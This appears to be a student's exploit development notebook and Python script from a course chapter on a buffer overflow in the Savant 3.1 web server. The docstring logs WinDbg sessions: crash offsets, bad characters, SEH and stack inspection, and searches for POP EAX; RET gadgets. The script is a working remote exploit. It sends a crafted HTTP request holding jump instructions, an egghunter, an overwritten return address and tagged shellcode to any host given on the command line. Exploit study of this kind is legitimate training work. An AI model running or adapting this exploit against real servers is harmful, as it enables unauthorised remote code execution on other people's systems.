"""
OMER: Generated this template for following along on Ch6

> Could try on my own to figure out how big of a payload i can send before it crashes


> Found out this is the max that triggers an AV on, but the EIP wasnt overwrittenFound out this is the max that triggers an AV on, but the EIP wasnt overwritten

> exchain isnt being overwritten, cant increase overwrite size either
!exchain
04aaff60: Savant+18468 (00418468)
04aaffcc: ntdll!_except_handler4+0 (76f58dd0)
04aaffe4: ntdll!FinalExceptionHandlePad60+0 (76f6672c)


> signs of SEH taking over?
0:005> dd esp
0265ea1c 00414141 0265ea74 0041703c 019157b0
0265ea2c 019157b0 00000000 00000000 00000000
0265ea3c 00000000 00000000 00000000 00000000
0265ea4c 00000000 00000000 00000000 00000000
0265ea5c 00000000 00000000 00000000 00000000
0265ea6c 00000000 00000002 00544547 00000000
0265ea7c 00000000 00000000 00000000 00000000
0265ea8c 4141412f 41414141 41414141 41414141

00414141 <- didnt notice this at first, but from the book i
            saw that this is null terminated cause of the 0's.
            i thought it was something else overwriting what
            im sending

book glossed over this since its not a viable path here
but it is possible to indirect jump to register and redirect exec flow
done by checking whats stored in which reg and then
`JMP/CALL reg` kind of already done with PPR

> 04baea20 04baea74 <- looks like its pointing somewhere close,
                       confirmed visually as well
0:005> dds esp
04baea1c 00414141 Savant+0x14141
04baea20 04baea74
04baea24 0041703c Savant+0x1703c
04baea28 001f57b0
04baea2c 001f57b0
04baea30 00000000
04baea34 00000000

> Using dc poi(esp+4), we can access the entire GET string used for the overflow
> Need a JMP command to jump me to dc poi(esp+4)
> offset found to be at 0x116

masf_nasm to jmp command in EIP
E911010000, this is way too long of an instruction

> found bad chars 0x00, 0x0A, 0x0D, 0x25
note, have not bothered with finding the offset yet
same goes for finding a suitable PPR lib as well as the offset

> gonna try to look for the offset, see how the URL is in memory
0040c05f -< offset
mangled, something intervened
attempt to find by bytes

> found! offset of 253
? why was the pattern fucked with
? null termination didnt trigger for 41's and 42's but
  triggers for the msf pattern


> what now?
recall.
    - ESP is malformed, cant jump since 9090 cant be loaded into the higher bytes due to the string routine adding a null char
        - need to figure out if i can hijack that routine
        - NOTE that i can still use something to JMP me 127 bytes front or back since i have EIP
    - found bad chars [0, a, d, 25]h
    - found offset @253, 4 bytes get loaded into EIP at offset of 253
    - esp+4 during the crash holds `GET /` + shellcode
    ! check if a pattern of 257 is screwed as well
        ? 257 checks out. idk why it fked with the pattern at 260


> Found a Application-Specific addresses for the running exe, however they are fully ass as it ends with a null byte &
additionally no other module is compiled with protections off

0:010> !nmod
00400000 00452000 Savant               /SafeSEH OFF

> giant PITA, need further thinking on this, have to manipulate the flow more precisely
0:005> u poi(esp + 4)
04a5ea74 47              inc     edi
04a5ea75 45              inc     ebp
04a5ea76 54              push    esp
04a5ea77 0000            add     byte ptr [eax],al
04a5ea79 0000            add     byte ptr [eax],al
04a5ea7b 0000            add     byte ptr [eax],al
04a5ea7d 0000            add     byte ptr [eax],al
04a5ea7f 0000            add     byte ptr [eax],al
0:005> u poi(esp)
04a5fe60 e8030000c0      call    c4a5fe68
04a5fe65 58              pop     eax
04a5fe66 ba01004000      mov     edx,offset Savant+0x1 (00400001)
04a5fe6b 003404          add     byte ptr [esp+eax],dh
04a5fe6e 0000            add     byte ptr [eax],al
04a5fe70 0200            add     al,byte ptr [eax]
04a5fe72 9b              wait
04a5fe73 7ac0            jp      04a5fe35
0:005> u esp
04a5ea1c 60              pushad
04a5ea1d fe              ???
04a5ea1e a5              movs    dword ptr es:[edi],dword ptr [esi]
04a5ea1f 0474            add     al,74h
04a5ea21 eaa5043c704100  jmp     0041:703C04A5
04a5ea28 b057            mov     al,57h
04a5ea2a ba01b057ba      mov     edx,0BA57B001h
04a5ea2f 0100            add     dword ptr [eax],eax


brute force but game plan, at least in a simple way, would be to get EIP to esp+4. after which our buffer can be run
the 47,45,54 is ASCII for GET but the EIP will read it as instructions for the CPU. save it for later, get to esp+4 first

for that i just need to pop the stack.

only way to do that is to find a pop instruction in the shit exe and return

┌──(kali㉿kali)-[~/Desktop/savant_3_1]
└─$ msf-nasm_shell
nasm > pop
/tmp/nasmXXXX20260102-162451-oc0kad:2: error: invalid combination of opcode and operands
Error: Assembler did not complete successfully: 1
nasm > pop eax
00000000  58                pop eax
nasm > ret
00000000  C3                ret


> okay so we'll look for 58 following by a C3 in the dll
s -b 00400000 00452000 58 C3

0:005> s -b 00400000 00452000 58 C3
00418674  58 c3 33 c0 c3 55 8b ec-51 51 83 7d 08 00 ff 75  X.3..U..QQ.}...u
0041924f  58 c3 a1 68 a2 44 00 56-83 f8 03 57 75 66 53 33  X..h.D.V...WufS3
004194f6  58 c3 33 c0 c3 a1 68 a2-44 00 83 f8 03 75 06 a1  X.3...h.D....u..
00419613  58 c3 a1 4c a2 44 00 8d-0c 80 a1 50 a2 44 00 8d  X..L.D.....P.D..
0041a531  58 c3 33 c0 c3 83 3d 68-ae 43 00 ff 53 55 56 57  X.3...=h.C..SUVW
0041af7f  58 c3 8b 65 e8 33 db 33-f6 83 4d fc ff 3b f3 74  X..e.3.3..M..;.t
0041b464  58 c3 33 c0 c3 55 8b ec-83 ec 0c 8b 45 0c 53 56  X.3..U......E.SV
0041b9fa  58 c3 33 c0 c3 0f b6 44-24 04 8a 4c 24 0c 84 88  X.3....D$..L$...
0041ba2e  58 c3 55 8b ec 83 ec 18-53 56 57 6a 19 e8 b6 f3  X.U.....SVWj....
0041c49a  58 c3 e8 c6 b9 ff ff 83-c0 54 c3 55 8b ec 81 ec  X........T.U....
0041cc30  58 c3 8b 65 e8 33 ff 89-7d dc 83 4d fc ff 8b 5d  X..e.3..}..M...]
0041cce4  58 c3 8b 65 e8 33 ff 33-db 83 4d fc ff 8b 75 d8  X..e.3.3..M...u.
0041eb74  58 c3 33 c0 c3 55 8b ec-83 ec 78 8d 45 88 6a 78  X.3..U....x.E.jx
0041fe21  58 c3 8b 65 e8 33 ff 89-7d d4 83 4d fc ff 8b 75  X..e.3..}..M...u
0041fe7e  58 c3 8b 65 e8 33 ff 33-db 83 4d fc ff 3b df 74  X..e.3.3..M..;.t
00420904  58 c3 8b 65 e8 33 ff 33-f6 83 4d fc ff 3b f7 74  X..e.3.3..M..;.t
00420a1d  58 c3 8b 65 e8 33 f6 33-ff 83 4d fc ff 3b fe 74  X..e.3.3..M..;.t
00420e69  58 c3 8b 65 e8 33 db 89-5d dc 83 4d fc ff 8b 75  X..e.3..]..M...u
00420ed8  58 c3 8b 65 e8 33 db 33-ff 83 4d fc ff 8b 75 e0  X..e.3.3..M...u.

0:005> u 00418674
Savant+0x18674:
00418674 58              pop     eax
00418675 c3              ret

good enough, even better cause we can cut off the null bytes and have the program add it for us later

> worked but the final instruction triggered final exception
(e78.a88): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0496fe60 ebx=001e57b0 ecx=0000000e edx=76f43060 esi=001e57b0 edi=0041703d
eip=0496ea8b esp=0496ea20 ebp=41414142 iopl=0         ov up ei ng nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010a82
0496ea8b 002f            add     byte ptr [edi],ch          ds:0023:004

what now lol


> glossed over the book a little, have to jump over that ass instruction somehow.
NOTE only reason its bad is because 2f is ascii for /

the book used the idea of messsing with the buffer used to store the HTTP method

> Tried a few combinations, what worked for me was to push the GET method further closer
to the / char. looks like i can +16 the initalBuffer


0:005> dc poi(esp+4)
048eea74  35343534 35343534 00544547 00000000  45454545GET.....
048eea84  00000000 00000000 4141412f 41414141  ......../AAAAAAA
048eea94  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
048eeaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA



> got it, buffer length of 20
0:005> dc poi(esp+4)
0499ea74  35343534 35343534 35343534 35343534  4545454545454545
0499ea84  35343534 00544547 4141412f 41414141  4545GET./AAAAAAA
0499ea94  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0499eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA

jmp nasm > jmp $+4
00000000  EB02              jmp 0x4
^will add this to the final 8 bytes right before "GET /", so i
can jump to a clean set of AAAA's


5jan_253p
> dumbo, just do a bigger jmp right at the start, ignore the header

5jan_329p
> using JE
nasm > xor ecx, ecx
00000000  31C9              xor ecx,ecx
nasm > test ecx, ecx
00000000  85C9              test ecx,ecx
nasm > je 0x17
00000000  0F8411000000      jz 0x17

5jan_402p
> worked, got to jump over the sus 2f, only have 250ish bytes for payload however. need
an egghunter

5jan_415p
> Did a weird thing with the way the request is now structured but i got the address
0:005> s -a 0x0 L?80000000 w00tw00t
005859cd  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD

-a means ascii string

6jan_126p
> as far as the request is concerned, basically a CRLF is sent in-situ of the GET Request
this will trigger the header parser to run and stop after our CRLF is seen. after which
the URI parser starts and triggers our AV

well since we have a marked segment incode, whats stopping me from sending an egghunter?


6jan_158p
> nothing is happening, not even page violations. maybe the egghunter was bad?
checking the book

6jan_224p
following the book
- found my tagged code, not in curStack however.

0:005> !address 018c59cd
Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
*** Unable to resolve unqualified symbol in Bp expression 'x00418674'.
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

Usage:                  Heap
Base Address:           018c0000
End Address:            018cf000
Region Size:            0000f000 (  60.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        018c0000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              heap owning the address: !heap -s -h 0x18c0000
More info:              heap segment
More info:              heap entry containing the address: !heap -x 0x18c59cd


Content source: 1 (target), length: 9633
"""

import socket
import sys
import struct


def send_crash(server, port):
    size = 260  # Triggered AV, EIP corrupted(barely)

    # 5jan_238p: Need to get into a habit of timestamping my comments + making a memory map of whats going on
    # MEM_MAP -> Buffer unusually long for HTTP method + buffer overflow available for the GET URL
    # 20 bytes

    # initBuffer = b"GET /"   # 54 45 74 00 2f, so at least 6 bytes i can mess with
    # initBuffer = b"\x45"*8
    methodBuffer = b""
    methodBuffer += b"\x31\xc9"  # 0x31C9, XOR ECX, ECX
    methodBuffer += b"\x85\xc9"  # 0x31C9, TEST ECX, ECX
    methodBuffer += b"\x0f\x84\x11"  # 0x0F8411000000, JZ 0x17
    methodBuffer += b" /"

    # 6jan_139p: passing egghunter before POP EAX, RET
    payload = b""
    egghunterPayload = b""
    egghunterPayload += b"\x90"*8       # 6jan_149: encountered misalignment since the jmp isnt exact
    egghunterPayload += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
    egghunterPayload += b"\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7"
    egghunterPayload += b"\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    egghunterPayload += b"\x41" * (253 - len(egghunterPayload))
    payload += egghunterPayload
    payload += b"\x74\x86\x41"  # 0x00418674: location of POP EAX, RET

    # 5jan_412p: Not sure why but the book added a rnrn here [UDPATE, check 6jan_126p]
    payload += b"\r\n" * 2

    
    # 6jan_139p: tagging shellcode and sending it to the program. 
    shellCode = b""
    shellCode += b"\x18\xd0\x63\x40\x2a\x7f\xd8\xce\x06\x08\xc6\x09"
    shellCode += b"\x68\x23\xbe\x85\x97\xcc\xbf\x8c\x53\x98\xef\xa6"
    shellCode += b"\x72\xa1\x7b\x36\x7a\x74\x2b\x66\xd4\x27\x8c\xd6"
    shellCode += b"\x94\x97\x64\x3c\x1b\xc7\x95\x3f\xf1\x60\x3f\xba"
    shellCode += b"\x92\x4e\x68\xc7\xe5\x27\x6b\xc7\xe8\x0c\xe2\x21"
    shellCode += b"\x80\x62\xa3\xfa\x3d\x1a\xee\x70\xdf\xe3\x24\xfd"
    shellCode += b"\xdf\x68\xcb\x02\x91\x98\xa6\x10\x46\x69\xfd\x4a"
    shellCode += b"\xc1\x76\x2b\xe2\x8d\xe5\xb0\xf2\xd8\x15\x6f\xa5"
    shellCode += b"\x8d\xe8\x66\x23\x20\x52\xd1\x51\xb9\x02\x1a\xd1"
    shellCode += b"\x66\xf7\xa5\xd8\xeb\x43\x82\xca\x35\x4b\x8e\xbe"
    shellCode += b"\xe9\x1a\x58\x68\x4c\xf5\x2a\xc2\x06\xaa\xe4\x82"
    shellCode += b"\xdf\x80\x36\xd4\xdf\xcc\xc0\x38\x51\xb9\x94\x47"
    shellCode += b"\x5e\x2d\x11\x30\x82\xcd\xde\xeb\x06\xfd\x94\xb1"
    shellCode += b"\x2f\x96\x70\x20\x72\xfb\x82\x9f\xb1\x02\x01\x15"
    shellCode += b"\x4a\xf1\x19\x5c\x4f\xbd\x9d\x8d\x3d\xae\x4b\xb1"
    shellCode += b"\x92\xcf\x59"
    payload += b"w00tw00t"
    payload += shellCode

    # Compile into final buffer
    buffer = b""
    buffer += methodBuffer
    buffer += payload
    buffer += b"\r\n\r\n"

    # Diagnostics
    print(f"[+] Sending methodBuffer: {methodBuffer}")
    print(f"[+] Sending Payload: {payload}")
    print(f"[+] methodBuffer Length: {len(methodBuffer)}")
    print(f"[+] Payload Length: {len(payload)}/260")
    print(f"[+] shellCode Length: {len(shellCode)}/400")

    # Send buffer to the host
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    s.close()


if __name__ == "__main__":
    try:
        server = sys.argv[1]
        port = 80
        send_crash(server=server, port=port)

        print("\n[!] Done!\n")
    except Exception as e:
        print(e)
